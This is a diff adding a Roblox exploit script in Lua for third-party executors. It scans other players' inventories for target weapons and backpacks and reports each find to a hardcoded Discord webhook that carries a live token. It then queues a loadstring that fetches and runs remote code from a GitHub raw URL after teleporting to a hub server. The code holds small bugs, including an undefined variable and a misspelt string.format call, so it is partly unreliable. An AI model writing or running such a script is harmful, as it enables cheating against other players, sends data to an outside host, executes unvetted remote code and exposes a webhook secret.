@@ -1,0 +1,74 @@
+--111--
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1514827895539896430/OPCNO3pephBfihJvHgs18lIij-BiD8V7VRDC3WTqWyu8nvVVTe33x_HqI9geoU0za6Af"
+local HUB_PLACE_ID = 15327728308
+
+local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4"}
+
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local function sendToDiscord(msg)
+    local req = syn and syn.request or http_request or request
+    if req then
+        pcall(function()
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({content = msg})
+            })
+        end)
+    end
+end
+
+
+task.wait(2)
+
+local found = {}
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player == Players.LocalPlayer then continue end
+   
+    local inv = player:WaitForChild("GunInventory", 3)
+    if inv then
+        for _, obj in ipairs(inv:GetChildren()) do
+            if obj:IsA("ObjectValue") and objValue then
+                local nome = obj.Value.Name
+                for _, alvo in ipairs(ITENS_ALVO) do
+                    if nome and nome:lower():find(alvo:lower()) then
+                        local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
+                        table.insert(found, stringformat("%s | %s | %d balas", player.Name, nome, mag))
+                        sendToDiscord("Found: " .. player.Name .. " | " .. nome)
+                    end
+                end
+            end
+        end
+    end
+    
+    local bp = player:GetAttribute("EquipmentBackpack")
+    if bp and tostring(bp):lower():find("backpacktier4") then
+        table.insert(found, string.format("%s | BackpackTier4 | N/A", player.Name))
+        sendToDiscord("Tier4: " .. player.Name)
+    end
+end
+
+if #found > 0 then
+else
+    sendToDiscord("Nothing")
+end
+
+
+task.wait(3)
+
+local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
+if qt then
+    qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cjiwghdtyasdnhatfy/wawyeayrrysey/refs/heads/main/1"))()]])
+end
+
+TeleportService:Teleport(HUB_PLACE_ID)
